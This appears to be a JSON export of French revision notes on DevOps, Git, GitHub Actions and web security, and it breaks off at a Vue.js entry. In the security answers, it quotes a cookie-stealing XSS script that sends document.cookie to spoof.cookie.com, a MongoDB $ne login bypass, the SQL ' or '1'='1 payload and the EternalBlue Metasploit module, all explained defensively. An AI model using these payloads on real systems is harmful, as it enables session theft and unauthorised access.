{
  "DevOps-324 > Général": [
    {
      "name": "Lean",
      "file": "/public/markdown/DevOps-324/1-Lean.md",
      "content": "lean software development _ source : devops introduction _ les 7 principes 1. éliminer le gaspillage 2. renforcer l’apprentissage 3. décider le plus tard possible 4. livraison rapide 5. donner la responsabilité à l’équipe 6. développer l’intégrité 7. optimiser le tout avantages plus de fonctionnalités en moins de temps réduction des activités inutiles → baisse des coûts équipe plus autonome lean vs agile lean : optimiser le système complet agile : s’adapter au changement → les deux visent l’amélioration continue. bonnes pratiques lean/agile cycles d’itérations découper le projet en mini cycles complets. tester, livrer et recueillir des retours régulièrement. réunions quotidiennes synchroniser l’équipe identifier les obstacles ajuster le travail du jour automatisation des tests types de tests automatisables : unitaires intégration autres tests répétitifs intégration continue ci intégrer le code fréquemment dans un repo partagé compiler + exécuter des tests automatisés détecter les bugs tôt = moins coûteux livraison continue cd compiler automatiquement tester automatiquement générer un artefact prêt à déployer → permet des sorties plus fréquentes et fiables. engagement continu du client évite de livrer un produit qui ne répond pas aux besoins les stakeholders doivent être impliqués très tôt 6. engagement continu du client évite de livrer un produit qui ne répond pas aux besoins les stakeholders doivent être impliqués très tôt conclusion lean vision minimaliste accent sur les gens et l’amélioration continue livraisons plus rapides, décisions de meilleure qualité"
    },
    {
      "name": "DevOps",
      "file": "/public/markdown/DevOps-324/2-DevOps.md",
      "content": "devops : principes essentiels _ source : devops introduction _ définition culture + pratiques + outils pour rapprocher : dev besoin de changement ops besoin de stabilité problème : le \"wall of confusion\" objectifs opposés entre dev et ops → manque de communication et d’outils intégrés. comment devops résout ce problème ? culture collaborative automatisation ci cd feedback continu ci/cd : les 8 étapes devops _ source : s 324 devops – 8 étapes _ 1. plan – user stories, objectifs, critères d’acceptation 2. code – développement, branches git 3. build – compilation, création des artefacts 4. test – unitaires, intégration, performance 5. release – préparation et documentation de la version 6. deploy – déploiement bleu/vert, canary, staging… 7. operate – surveillance, gestion incidents 8. monitor – logs, métriques, amélioration continue ci vs cd _ source : devops 8 étapes _ continuous integration ci à chaque push : build tests automatisés analyse du code → garantit que les changements n’introduisent pas de régressions. continuous delivery & continuous deployment cd delivery : automatisé jusqu’au _staging_, déploiement en prod manuel. deployment : déploiement _automatique_ en production. construire un plan ci/cd _ source : plan ci/cd _ étapes clés définir les objectifs sécurité, rollback, fréquence, performance étudier l’architecture frameworks, dépendances, type d’application automatiser les tests unitaires, intégration, e2e identifier les environnements dev / test / staging / prod intégrer la sécurité scans, audit dépendances, lint documenter le pipeline complet"
    },
    {
      "name": "Git",
      "file": "/public/markdown/DevOps-324/3-Git.md",
      "content": "git – principes fondamentaux _ source : devops introduction + git conventions _ workflow git de base working directory → staging → repository local → repository distant commandes clés : git add git commit git push git pull git reset branches git : conventions branches régulières main : production develop : intégration test : qa branches temporaires feature/... – nouvelles fonctionnalités bugfix/... – correction de bugs hotfix/... – correctif urgent en production release/... – préparation d’une version docs/... – documentation règles de nommage minuscules, pas d’espace éviter . , ne pas terminer par / ne pas utiliser les noms réservés head, etc. versioning semver _ source : git conventions _ format : majeur.minor.patch majeur : rupture de compatibilité mineur : nouvelle fonctionnalité rétrocompatible patch : correction de bug exemples : v1.0.0 v2.1.7 git stash : indispensable _ source : git stash _ à quoi sert git stash ? mettre de côté du travail sans commit : changement de branche pull test rapide commandes git stash ranger le travail git stash list lister git stash apply restaurer sans supprimer git stash pop restaurer + supprimer git stash drop supprimer un stash git stash clear tout supprimer git stash push m \"message\" git stash u inclure les non trackés git stash a inclure absolument tout ce qui doit aller dans git / ce qui ne doit pas ✔️ à mettre dans git code source fichiers de config modèle .env.example images et ressources statiques ❌ à ne pas mettre secrets / .env dépendances node_modules , etc. artéfacts de build"
    }
  ],
  "DevOps-324 > Github Actions": [
    {
      "name": "Introduction",
      "file": "/public/markdown/DevOps-324/Github Actions/1-Introduction.md",
      "content": "module 324 – github actions introduction source : s 324 03 githubactions introduction.pdf qu’est ce que github actions github actions est une plateforme ci/cd permettant d'automatiser des tâches telles que tests, déploiements, formatage du code et analyses. elle fonctionne via des workflows déclenchés par des événements ou une planification. composants workflow : fichier yaml décrivant l'automatisation. event : déclencheur du workflow. jobs : unités de travail regroupant des étapes. steps : opérations exécutées séquentiellement. actions : blocs réutilisables. runner : machine d'exécution. exemple minimal yaml name: exemple workflow on: push jobs: build: runs on: ubuntu latest steps: uses: actions/checkout@v5 événements un workflow peut être déclenché par : push pull_request workflow_dispatch schedule jobs les jobs s'exécutent par défaut en parallèle. ils doivent définir un runner. yaml jobs: build: runs on: ubuntu latest runners deux types : runners github hébergés runners self hosted steps deux types : steps \"run\" shell steps \"uses\" actions actions exemple d’action officielle : yaml uses: actions/setup node@v3 with: node version: 18 exemple d’action locale : yaml uses: ./.github/actions/ma super action runs exécution d'une commande shell : yaml run: npm ci run: npm test synthèse workflow → event → jobs → steps → actions → runner. les steps exécutent l’automatisation. les jobs peuvent être parallèles ou séquentiels."
    },
    {
      "name": "GitHub Actions Plus",
      "file": "/public/markdown/DevOps-324/Github Actions/2-GitHub Actions Plus.md",
      "content": "module 324 – github actions plus source : s 324 04 githubactions plus.pdf variables types : variables personnalisées variables par défaut github_repository, github_run_id, etc. variables système définition niveau workflow yaml env: var_global: 'valeur' niveau job yaml jobs: build: env: var_job: 'valeur job' niveau step yaml steps: env: var_step: 'valeur step' voir les variables présentes yaml run: env expressions écrites dans : ${{ ... }} exemple : yaml if: ${{ env.mode == 'production' }} secrets caractéristiques : définis dans settings > secrets sensibles à la casse limite 48 ko ne doivent pas commencer par github\\_ exemple d'utilisation : yaml run: echo \"secret: ${{ secrets.mon_secret }}\" contextes types principaux : github env job steps runner secrets vars exemple : yaml run: echo \"url du repo : ${{ github.repositoryurl }}\" synthèse les variables permettent de configurer un workflow. les expressions ajoutent une logique conditionnelle. les secrets permettent de gérer des données sensibles. les contextes donnent accès aux informations d'exécution."
    }
  ],
  "Sécurité-183 > Questions": [
    {
      "name": "Index",
      "file": "/public/markdown/Sécurité-183/Questions/0-Index.md",
      "content": "<! 'noaudio' > index des questions de révision sécurité 183 ce fichier regroupe l'ensemble des questions traitées, classées par thématique. cliquez sur une question pour accéder directement à sa réponse détaillée. 1. authentification & mots de passe login1 : à quoi sert le « salt » ? ./1 authentification%20%26%20mots%20de%20passe.md login1 login2 : exemples de mots de passe instant, minutes, années ./1 authentification%20%26%20mots%20de%20passe.md login2 login3 : différence hachage vs chiffrement ./1 authentification%20%26%20mots%20de%20passe.md login3 login4 : démonstration temps de crack ./1 authentification%20%26%20mots%20de%20passe.md login4 login5 : étapes d'enregistrement sécurisé ./1 authentification%20%26%20mots%20de%20passe.md login5 auth1 : authentification multi facteurs mfa ./1 authentification%20%26%20mots%20de%20passe.md auth1 2. xss & manipulation du dom xss1 : définition et implications ./2 xss%20%26%20manipulation%20du%20dom.md xss1 xss2 : protection en node.js ./2 xss%20%26%20manipulation%20du%20dom.md xss2 xss3 : vol de mot de passe via xss ? ./2 xss%20%26%20manipulation%20du%20dom.md xss3 xss4 : analyse d'un script malveillant ./2 xss%20%26%20manipulation%20du%20dom.md xss4 xss5 : dom injection ./2 xss%20%26%20manipulation%20du%20dom.md xss5 3. injections sql & nosql isql1 : vulnérabilité mongodb ./3 injections.md isql1 isql2 : injection sql simple ' or '1'='1 ./3 injections.md isql2 isql3 : modification de données via injection ./3 injections.md isql3 isql4 : gestion des erreurs sql en prod ./3 injections.md isql4 4. attaques ddos & défense ddos1 : définition ./4 attaques%20ddos%20%26%20défense.md ddos1 ddos2 : rôle du ttl dns ./4 attaques%20ddos%20%26%20défense.md ddos2 ddos3 : techniques de mitigation ./4 attaques%20ddos%20%26%20défense.md ddos3 5. sécurité des e mails & images mail1 : protection adresse e mail ./5 sécurité%20des%20e mails%20%26%20images.md mail1 mail2 : cacher un copyright stéganographie ./5 sécurité%20des%20e mails%20%26%20images.md mail2 mail4 : signature numérique d'image ./5 sécurité%20des%20e mails%20%26%20images.md mail4 6. outils d’audit & méthodologies outil1 : 3 outils d'audit web ./6 outils%20d’audit%20%26%20méthodologies.md outil1 outil2 : metasploit ./6 outils%20d’audit%20%26%20méthodologies.md outil2 outil3 : légalité des tests swisscom ./6 outils%20d’audit%20%26%20méthodologies.md outil3 outil4 : black box testing ./6 outils%20d’audit%20%26%20méthodologies.md outil4 7. owasp owasp1 : broken access control ./7 owasp.md owasp1 owasp2 : cryptographic failures ./7 owasp.md owasp2 owasp3 : top 5 owasp + insecure design ./7 owasp.md owasp3 owasp4 : injection ./7 owasp.md owasp4 owasp5 : security misconfiguration ./7 owasp.md owasp5 owasp6 : présentation owasp ./7 owasp.md owasp6 8. jwt json web tokens jwt1 : structure d'un token ./8 jwt.md jwt1 jwt2 : utilité et stateless ./8 jwt.md jwt2 9. hashing & algorithmes hash1 : pourquoi md5 est obsolète ./9 hashing%20%26%20algorithmes.md hash1 10. divers & sécurité générale misc1 : risques des librairies tierces ./10 divers%20%26%20sécurité%20générale.md misc1 misc2 : chiffrement repos vs transit ./10 divers%20%26%20sécurité%20générale.md misc2"
    },
    {
      "name": "Authentification & Mots de passe",
      "file": "/public/markdown/Sécurité-183/Questions/1-Authentification & Mots de passe.md",
      "content": "<! instruction_audio: lis chaque question puis immédiatement sa réponse. adopte un ton formel, professionnel et motivant. ne lis pas ce bloc. > 1. authentification & mots de passe _ source : i183 ts2 listedesquestions.pdf _ <a id=\"login1\"></a> login1 — à quoi sert le « salt » ajouté à un mot de passe ? un salt est une valeur aléatoire ajoutée au mot de passe avant son hachage. il permet de renforcer massivement la sécurité en empêchant : l’utilisation de rainbow tables , car chaque hachage devient unique, la détection automatique de deux utilisateurs ayant le même mot de passe , les attaques basées sur des hachages prévisibles. même si une base de données est volée, un attaquant ne peut pas pré calculer des correspondances. le salt doit être unique , long , aléatoire et stocké avec le hash , car il n’a pas besoin d’être secret. il rend les _rainbow tables_ inutiles car il faudrait générer une table entière pour chaque salt différent. <a id=\"login2\"></a> login2 — exemples de mots de passe selon difficulté cracké instantanément mots de passe trop courts ou très connus. ils sont présents dans toutes les bases de données d’attaques rockyou.txt . un pirate teste d’abord ces valeurs avant toute attaque plus coûteuse. > _exemples :_ 123456 , password , admin , qwerty . cracké en minutes/heures combinaisons un peu variées mais basées sur des schémas prévisibles : ajout d’un chiffre en fin, remplacement de lettres évidentes o → 0 . ces “stratégies” ne trompent pas les outils modernes. > _exemples :_ maison123 , p@ssw0rd! , soleil2024 . cracké en années phrases secrètes longues, combinant plusieurs classes de caractères. leur longueur augmente exponentiellement l’espace de recherche. plus important encore : elles sont difficiles à deviner et à retenir pour un attaquant , mais faciles à retenir pour l’utilisateur . > _exemples :_ j'aime.manger.des.pommes.rouges! , correct horse battery staple . <a id=\"login3\"></a> login3 — différence entre hachage et chiffrement hachage : opération à sens unique . on utilise des algorithmes conçus pour être lents bcrypt, argon2 et qui résistent aux attaques gpu. idéal pour les mots de passe, car un attaquant ne peut jamais “récupérer” la valeur d’origine. > récupération : impossible mathématiquement. seule méthode : brute force essayer toutes les combinaisons . chiffrement : opération réversible . si une clé fuite, toute la donnée devient compromise. utile pour la confidentialité : numéros de cartes, documents privés, fichiers sensibles. > récupération : possible instantanément si l'on possède la clé de déchiffrement . un système sécurisé doit savoir quand utiliser l’un ou l’autre . les mots de passe ne doivent jamais être chiffrés. <a id=\"login4\"></a> login4 — temps de crack d’un mot de passe le temps de crack provient de la combinaison : de la taille de l’alphabet 65 caractères dans l’exemple , de la longueur du mot de passe 12 , et de la puissance de l'attaquant 60 000 essais/s dans l'exemple, mais des millions sur du matériel industriel . démonstration mathématique : combinaisons : 65^12 ≈ 5,69 × 10^21 temps secondes : 5,69 × 10^21 / 60 000 ≈ 9,48 × 10^16 secondes temps années : 9,48 × 10^16 / 3600 × 24 × 365 ≈ 3 milliards d'années les gpu modernes permettent de tester des milliards d’essais par seconde. c’est pour cela que : les mots de passe courts deviennent inutiles, les attaques de brute force sont de plus en plus réalistes, et l’utilisation d’algorithmes de hash lents est absolument indispensable. <a id=\"login5\"></a> login5 — étapes d’enregistrement d’un mot de passe 1. recevoir le mot de passe via un canal sécurisé https . 2. générer un salt cryptographiquement sûr crypto.randombytes . 3. combiner le mot de passe au salt. 4. hacher avec un algorithme résistant au brute force bcrypt, argon2, scrypt . 5. stocker uniquement le résultat : le hash, + le salt, + éventuellement le coût utilisé cost factor . ainsi, même si la base est volée : chaque mot de passe demande une attaque individuelle, et le coût pour un attaquant devient astronomique. <a id=\"auth1\"></a> auth1 — authentification multi facteurs l’amf réduit fortement le risque de compromission en ajoutant une barrière physique ou biométrique. elle repose sur l'utilisation d'au moins deux facteurs parmi : 1. ce que je sais mot de passe, pin . 2. ce que je possède smartphone, clé yubikey, carte à puce . 3. ce que je suis empreinte, faceid, iris . même si un attaquant obtient le mot de passe : il ne possède pas le téléphone totp, sms, clé fido2 , il ne possède pas l’empreinte ou le visage. les systèmes modernes google, microsoft, github recommandent fido2 qui est résilient même contre le phishing."
    },
    {
      "name": "XSS & Manipulation du DOM",
      "file": "/public/markdown/Sécurité-183/Questions/2-XSS & Manipulation du DOM.md",
      "content": "<! instruction_audio: lis chaque question puis immédiatement sa réponse. adopte un ton formel, professionnel et motivant. ne lis pas ce bloc. > 2. xss & manipulation du dom _ source : i183 ts2 listedesquestions.pdf _ <a id=\"xss1\"></a> xss1 — définition une faille xss pour cross site scripting est une vulnérabilité de sécurité web qui permet à un attaquant d'injecter du code malveillant généralement du javascript dans une page web visitée par d'autres utilisateurs. contrairement à d'autres attaques qui visent la base de données comme les injections sql , l'xss vise directement les visiteurs du site. le site web sert involontairement de \"complice\" pour livrer le code malveillant au navigateur de la victime. une faille xss permet à un attaquant : d’exécuter du javascript, dans la page consultée par la victime, sans toucher au serveur. c’est l’une des failles les plus fréquentes. elle peut donner un accès complet à la session, modifier l’interface, ou détourner les formulaires. <a id=\"xss2\"></a> xss2 — protection en node.js protection efficace → combinaison de plusieurs approches : 1. échappement systématique du contenu avant affichage dans les templates. 2. frameworks modernes react, vue, angular qui échappent automatiquement le html injecté. 3. validation stricte côté serveur : utiliser des middlewares comme helmet app.use helmet pour sécuriser les headers http. supprimer les balises <script> , filtrer les événements html onclick , onload . 4. application d’une content security policy : empêche l’exécution de scripts inline, limite les sources autorisées, bloque les injections même si elles passent dans le dom. une bonne csp peut neutraliser la majorité des xss . <a id=\"xss3\"></a> xss3 — une xss peut elle voler un mot de passe ? indirectement, oui. une xss peut : voler les cookies de session, voler les tokens jwt stockés dans le localstorage, intercepter les frappes, imiter un formulaire de connexion, envoyer toute donnée entrée par la victime vers un serveur pirate. en pratique, l’attaquant vole la session , ce qui équivaut à voler l'accès complet du compte. <a id=\"xss4\"></a> xss4 — effet du script fourni le script : > <script language=etmlscript>console.log \"you have been hacked by narut0\" ; window.location.href=\"https://spoof.cookie.com?data=\"+document.cookie;</script> si ce script est exécuté malgré l'attribut language exotique : 1. message console : affiche \"you have been hacked by narut0\" preuve de concept . 2. vol de session : redirige l'utilisateur vers spoof.cookie.com . 3. exfiltration : passe le contenu de document.cookie contenant l'id de session en paramètre get data . en plus : l’attaquant peut rejouer la session ailleurs, contourner la connexion, agir comme si c’était la victime. c’est l’un des scénarios xss les plus classiques et les plus dangereux. <a id=\"xss5\"></a> xss5 — dom injection ici, la faille provient du côté client , souvent lorsque : on insère du html directement dans innerhtml , on manipule des chaînes non filtrées dans le dom, on charge du contenu issu de l’url sans validation. ces attaques ne passent parfois même pas par le serveur , ce qui les rend difficiles à détecter."
    },
    {
      "name": "Injections",
      "file": "/public/markdown/Sécurité-183/Questions/3-Injections.md",
      "content": "<! instruction_audio: lis chaque question puis immédiatement sa réponse. adopte un ton formel, professionnel et motivant. ne lis pas ce bloc. > 3. injections sql & nosql _ source : i183 ts2 listedesquestions.pdf _ <a id=\"isql1\"></a> isql1 — mongodb vulnérable aux injections ? oui, et ces injections peuvent : contourner une authentification, modifier les filtres de recherche, exploiter les opérateurs $ne , $gt , $regex , $or . json username: \"admin\" password: { \"$ne\": null } > trouve l'utilisateur 'admin' dont le mot de passe n'est pas nul. dans des systèmes mal codés, une simple requête json peut retourner tous les utilisateurs . <a id=\"isql2\"></a> isql2 — ' or '1'='1 ce payload fonctionne car il force la condition sql à être toujours vraie , ce qui : contourne la connexion, permet l’accès à des données sensibles, prouve que l’application n’utilise pas de requêtes préparées. aujourd’hui, toute api doit utiliser : → paramètres préparés , → orm sécurisés , → filtres stricts . <a id=\"isql3\"></a> isql3 — modification de base par injection si aucune protection n’est appliquée, une injection peut non seulement lire les données, mais aussi : modifier, supprimer, créer des tables. c’est la raison pour laquelle : les droits d’un compte sql doivent être minimaux , aucune application ne devrait utiliser un compte admin sur la prod. <a id=\"isql4\"></a> isql4 — masquer les erreurs sql une bonne api : masque les messages techniques, logue l’erreur côté serveur, renvoie un message simple comme _\"erreur interne\"_. configuration recommandée : node.js : définir node_env=production pour désactiver les stacktraces détaillées. mysql : configurer le driver avec debug: false . code : utiliser des blocs try/catch et ne jamais renvoyer l'objet error brut au client. exposer une erreur sql revient à dévoiler : le type de base, la structure des tables, les noms de colonnes, et parfois des chemins internes. un cadeau pour un pirate."
    },
    {
      "name": "Attaques DDoS & Défense",
      "file": "/public/markdown/Sécurité-183/Questions/4-Attaques DDoS & Défense.md",
      "content": "<! instruction_audio: lis chaque question puis immédiatement sa réponse. adopte un ton formel, professionnel et motivant. ne lis pas ce bloc. > 4. ddos _ source : i183 ts2 listedesquestions.pdf _ <a id=\"ddos1\"></a> ddos1 — définition une attaque ddos consiste à submerger un serveur par des milliers ou millions de requêtes simultanées. objectif : rendre le service indisponible. <a id=\"ddos2\"></a> ddos2 — un ttl faible pour limiter l’impact le ttl time to live dns détermine la durée de cache d'une ip. un ttl faible ex: 60s permet : de changer rapidement l'adresse ip du serveur si l'actuelle est attaquée null routing , de rediriger le trafic vers un système de mitigation scrubbing center sans attendre des heures, de faciliter le dns round robin pour répartir la charge sur plusieurs serveurs. ce n’est pas une protection complète, mais un outil parmi d’autres. <a id=\"ddos3\"></a> ddos3 — méthodes de mitigation cdn : absorption du trafic. rate limiting : limite les requêtes abusives. load balancing : répartit la charge. firewall applicatif : bloque les patterns suspects. scrubbing centers : filtrage massif géré par les hébergeurs. une bonne architecture combine plusieurs solutions."
    },
    {
      "name": "Sécurité des e-mails & images",
      "file": "/public/markdown/Sécurité-183/Questions/5-Sécurité des e-mails & images.md",
      "content": "<! instruction_audio: lis chaque question puis immédiatement sa réponse. adopte un ton formel, professionnel et motivant. ne lis pas ce bloc. > 5. e mails & images _ source : i183 ts2 listedesquestions.pdf _ <a id=\"mail1\"></a> mail1 — trois manières de protéger son adresse mail 1. obfuscation simple ex: bob at mail.com _force_ : très simple, lisible par l'humain. _faiblesse_ : inefficace, les bots modernes comprennent cette syntaxe. 2. encodage html entités & 64; _force_ : invisible pour l'utilisateur, affichage normal. _faiblesse_ : protection faible, les bots décodent le html. 3. encodage javascript _force_ : l'adresse n'apparaît pas en clair dans le code source, nécessite un moteur js. _faiblesse_ : inaccessible si js est désactivé, et les bots sophistiqués l'exécutent. 4. formulaire de contact _force_ : l'adresse n'est jamais exposée, protection antispam captcha . _faiblesse_ : plus complexe à mettre en place backend nécessaire . <a id=\"mail2\"></a> mail2 — copyright dans une image deux méthodes : stéganographie : invisible, idéale pour prouver la paternité. watermarking : visible, dissuasif contre la réutilisation. les professionnels combinent souvent les deux. <a id=\"mail4\"></a> mail4 — qui paie ? la signature numérique coûte : en matériel clé privée sécurisée , en services de certification, en infrastructure. c’est donc en général l'organisation ou le professionnel qui a besoin de prouver l’authenticité d’une image."
    },
    {
      "name": "Outils d’audit & Méthodologies",
      "file": "/public/markdown/Sécurité-183/Questions/6-Outils d’audit & Méthodologies.md",
      "content": "<! instruction_audio: lis chaque question puis immédiatement sa réponse. adopte un ton formel, professionnel et motivant. ne lis pas ce bloc. > 6. outils d’audit & méthodologies _ source : i183 ts2 listedesquestions.pdf _ <a id=\"outil1\"></a> outil1 — trois outils d’audit owasp zap : open source, idéal pour étudiants. burp suite : complet, intègre proxy, scanner, repeater. nmap : analyse des ports, versioning, découverte réseau. <a id=\"outil2\"></a> outil2 — metasploit c'est un framework permettant : exploitation de failles connues modules , création d’exploits personnalisés, automatisation des attaques. outil puissant : utilisé uniquement en environnement autorisé. exemple concret : utiliser le module exploit/windows/smb/ms17_010_eternalblue pour prendre le contrôle d'un serveur windows non patché. <a id=\"outil3\"></a> outil3 — metasploit sur swisscom ? non. toute attaque sans autorisation : viole la loi suisse, peut mener à des poursuites pénales, viole les conditions d'utilisation des opérateurs. seuls les tests autorisés bug bounty, pentest contractuel sont légaux. <a id=\"outil4\"></a> outil4 — black box testing le testeur ne connaît rien de l’application : pas de code, pas de documentation, pas d’accès interne. il simule le point de vue d’un pirate réel. avantages : conditions réalistes simulation d'attaque externe . indépendance vis à vis de la documentation souvent fausse . inconvénients : couverture de test incomplète on ne trouve pas tout . plus lent tâtonnement . peut rater des failles évidentes dans le code source white box préférable pour l'exhaustivité ."
    },
    {
      "name": "OWASP",
      "file": "/public/markdown/Sécurité-183/Questions/7-OWASP.md",
      "content": "<! instruction_audio: lis chaque question puis immédiatement sa réponse. adopte un ton formel, professionnel et motivant. ne lis pas ce bloc. > 7. owasp _ source : i183 ts2 listedesquestions.pdf _ <a id=\"owasp1\"></a> owasp1 — broken access control failles liées aux droits d’accès : elles permettent souvent : consultation de données d'un autre utilisateur, modification non autorisée, escalade de privilèges. c’est la vulnérabilité la plus courante dans les applications modernes. <a id=\"owasp2\"></a> owasp2 — cryptographic failures problèmes liés : au mauvais choix d’algorithmes, à des clés trop courtes, à des données non chiffrées. les conséquences peuvent être désastreuses : fuite massive de données, déchiffrement, accès non autorisé. <a id=\"owasp3\"></a> owasp3 — top 5 + insecure design 1. broken access control contrôle d’accès défaillant c'est la nouvelle faille numéro 1 elle était 5ème en 2017 . elle survient lorsque les restrictions sur ce que les utilisateurs authentifiés peuvent faire ne sont pas appliquées correctement. > concrètement : un utilisateur normal change l'url de app.com/user/123 vers app.com/user/124 et accède aux données de quelqu'un d'autre. ou un utilisateur standard accède à une page /admin sans en avoir les droits. 2. cryptographic failures défaillances cryptographiques auparavant appelée \"exposition de données sensibles\". cela concerne la protection des données au repos base de données et en transit réseau . > concrètement : stocker des mots de passe en clair, ne pas utiliser https, utiliser des algorithmes de hachage obsolètes comme md5 ou sha1 , ou mal gérer les clés de chiffrement. 3. injection elle glisse de la 1ère à la 3ème place, mais reste critique. cela regroupe les injections sql, nosql comme vu pour mongodb , les injections de commandes os, et désormais les failles xss cross site scripting qui ont été fusionnées dans cette catégorie. > concrètement : envoyer des données non fiables à un interpréteur qui les exécute comme une commande. 4. insecure design conception non sécurisée c'est une nouvelle catégorie apparue en 2021. elle met l'accent sur le fait que la sécurité doit être pensée dès l'architecture, et pas seulement au niveau du code. > concrètement : une application e commerce qui ne limite pas le nombre de tentatives de paiement permettant à un bot de tester des milliers de cartes volées . ce n'est pas un bug de code, c'est un bug de logique métier/conception. 5. security misconfiguration mauvaise configuration de sécurité elle remonte de la 6ème place. avec la complexification des systèmes cloud, conteneurs , les erreurs de config sont fréquentes. > concrètement : laisser les mots de passe par défaut \"admin/admin\" , laisser le mode \"debug\" activé en production qui affiche des erreurs détaillées aux pirates , ou des permissions cloud aws s3 trop ouvertes. <a id=\"owasp4\"></a> owasp4 — injection types : sql nosql os command ldap email header template injection c’est l'une des failles les plus anciennes, mais toujours présente. <a id=\"owasp5\"></a> owasp5 — security misconfiguration erreurs fréquentes : debug actif en prod, ports/admin exposés, headers de sécurité absents, fichiers sensibles non supprimés. très simple à exploiter, extrêmement courant. <a id=\"owasp6\"></a> owasp6 — qu’est ce qu’owasp ? owasp est une organisation mondiale dédiée à la sécurité : elle produit : guides pratiques, le célèbre owasp top 10 , une base complète de bonnes pratiques. owasp zap scanner de vulnérabilités . owasp juice shop application vulnérable pour l'entraînement . web security testing guide wstg . référence essentielle pour tout développeur web."
    },
    {
      "name": "JWT",
      "file": "/public/markdown/Sécurité-183/Questions/8-JWT.md",
      "content": "<! instruction_audio: lis chaque question puis immédiatement sa réponse. adopte un ton formel, professionnel et motivant. ne lis pas ce bloc. > 8. jwt _ source : i183 ts2 listedesquestions.pdf _ <a id=\"jwt1\"></a> jwt1 — structure header.payload.signature header : algorithme + type, payload : données claims , signature : garantit l’intégrité. <a id=\"jwt2\"></a> jwt2 — utilité le jwt prononcé \"jot\", pour json web token est un standard ouvert utilisé pour échanger des informations de manière sécurisée entre deux parties. permet une authentification stateless , évite l'utilisation de sessions serveur, facilite les architectures distribuées. mais attention : un jwt volé est valide jusqu’à expiration → ne jamais le stocker dans localstorage . le problème des sessions classiques le \"stateful\" avant les jwt, la méthode standard fonctionnait ainsi : l'utilisateur se connecte. le serveur crée une session et la stocke dans sa mémoire ram ou sa base de données. le serveur donne un id de session cookie à l'utilisateur. à chaque requête de l'utilisateur, le serveur doit chercher cet id dans sa mémoire pour savoir qui est l'utilisateur. le problème : si vous avez 1 million d'utilisateurs ou si vous utilisez plusieurs serveurs cluster/microservices , synchroniser cette mémoire devient très lourd et complexe. la solution jwt le \"stateless\" avec le jwt, on cherche à rendre le client le navigateur autonome. l'utilisateur se connecte. le serveur ne stocke rien en mémoire. il crée un jeton jwt contenant les infos de l'utilisateur id, rôle, expiration et le signe électroniquement. il donne ce jeton à l'utilisateur. à chaque requête, l'utilisateur présente son badge le jwt . le serveur vérifie juste la signature du badge. si la signature est valide, il sait qui est l'utilisateur sans avoir besoin de consulter une base de données. l'analogie du festival session classique : vous donnez votre nom à l'entrée. le vigile doit regarder sur une liste papier immense à chaque fois que vous voulez entrer dans une zone vip. jwt : on vous donne un bracelet inaltérable à l'entrée. le vigile regarde juste votre poignet. si vous avez le bracelet, vous passez. il n'a pas besoin de liste. le piège de sécurité le stockage du jwt est un sujet critique : si vous stockez le jwt dans le localstorage du navigateur : il est accessible via javascript. une faille xss permettrait à un attaquant de voler le jeton et de se faire passer pour vous. si vous le stockez dans un cookie httponly : le javascript ne peut pas le lire protège du vol via xss , mais vous devenez vulnérable aux failles csrf cross site request forgery ."
    },
    {
      "name": "Hashing & Algorithmes",
      "file": "/public/markdown/Sécurité-183/Questions/9-Hashing & Algorithmes.md",
      "content": "<! instruction_audio: lis chaque question puis immédiatement sa réponse. adopte un ton formel, professionnel et motivant. ne lis pas ce bloc. > 9. hashing & algorithmes _ source : i183 ts2 listedesquestions.pdf _ <a id=\"hash1\"></a> hash1 — pourquoi md5 est compromis ? md5 message digest 5 est considéré comme cryptographiquement brisé et dangereux à utiliser aujourd'hui pour la sécurité. pour comprendre pourquoi, il faut revenir à la promesse de base d'une fonction de hachage : elle doit agir comme une empreinte digitale numérique. 1. les collisions le problème d'unicité c'est la faille la plus critique pour la signature numérique. le problème : il est mathématiquement possible et facile aujourd'hui de créer deux fichiers différents qui produisent exactement la même empreinte md5. la conséquence : l'intégrité n'est plus garantie. un pirate peut remplacer un fichier sain par un fichier malveillant sans que la signature ne change attaque des \"jumeaux maléfiques\" . 2. la vitesse de calcul le problème des mots de passe c'est la faille critique pour le stockage des identifiants. le problème : md5 est trop léger et rapide. un ordinateur moderne peut calculer des milliards de hashs md5 par seconde. la conséquence : si une base de données est volée, les mots de passe hachés en md5 sont cassés quasi instantanément par \"brute force\" essai de toutes les combinaisons . il ne ralentit pas assez l'attaquant. 3. la vulnérabilité prouvée le problème historique c'est le constat d'échec technique. le problème : l'algorithme est trop court 128 bits et structurellement faible face aux méthodes de cryptanalyse actuelles. la conséquence : des attaques réelles et célèbres comme le malware flame ont déjà exploité ces failles pour contourner la sécurité de windows. ce n'est plus une théorie, l'algorithme est officiellement \"brisé\". les algorithmes recommandés : bcrypt, argon2, pbkdf2, sha 256/512 pour intégrité, pas pour mots de passe ."
    },
    {
      "name": "Divers & Sécurité générale",
      "file": "/public/markdown/Sécurité-183/Questions/10-Divers & Sécurité générale.md",
      "content": "<! instruction_audio: lis chaque question puis immédiatement sa réponse. adopte un ton formel, professionnel et motivant. ne lis pas ce bloc. > 10. divers _ source : i183 ts2 listedesquestions.pdf _ <a id=\"misc1\"></a> misc1 — risques des librairies tierces utiliser du code que l'on n'a pas écrit soi même introduit plusieurs vecteurs d'attaque : 1. vulnérabilités connues cve : une librairie peut contenir une faille découverte plus tard ex: log4j . si elle n'est pas mise à jour, l'application est vulnérable. 2. attaques de la supply chain : un attaquant peut compromettre le compte d'un mainteneur de package npm, pypi et injecter du code malveillant dans une mise à jour mineure. 3. abandon du projet : si une librairie n'est plus maintenue, les futures failles ne seront jamais corrigées. 4. dépendances transitives : on installe une librairie a, qui installe b, qui installe c. une faille dans c compromet a. bonnes pratiques : utiliser npm audit ou owasp dependency check . verrouiller les versions package lock.json . minimiser le nombre de dépendances. <a id=\"misc2\"></a> misc2 — chiffrement au repos / en transit il s'agit de protéger la donnée dans ses deux états principaux : 1. en transit data in transit : définition : données qui circulent sur le réseau internet, wi fi . risque : interception man in the middle , écoute sniffing . solution : chiffrement via tls/ssl https, wss, vpn . cela crée un tunnel sécurisé entre le client et le serveur. 2. au repos data at rest : définition : données stockées de manière persistante disque dur, base de données, backup . risque : vol physique du serveur, vol de disque dur, accès non autorisé au système de fichiers. solution : chiffrement du disque bitlocker, luks ou chiffrement de la base de données aes 256 . si le disque est volé, les données sont illisibles sans la clé. conclusion : une sécurité complète nécessite les deux. https ne protège pas une base de données volée, et le chiffrement disque ne protège pas les données interceptées sur le wi fi."
    }
  ],
  "Web-294 > VueJS": [
    {
      "name": "Introduction",
      "file": "/public/markdown/Web-294/VueJS/1-Introduction.md",
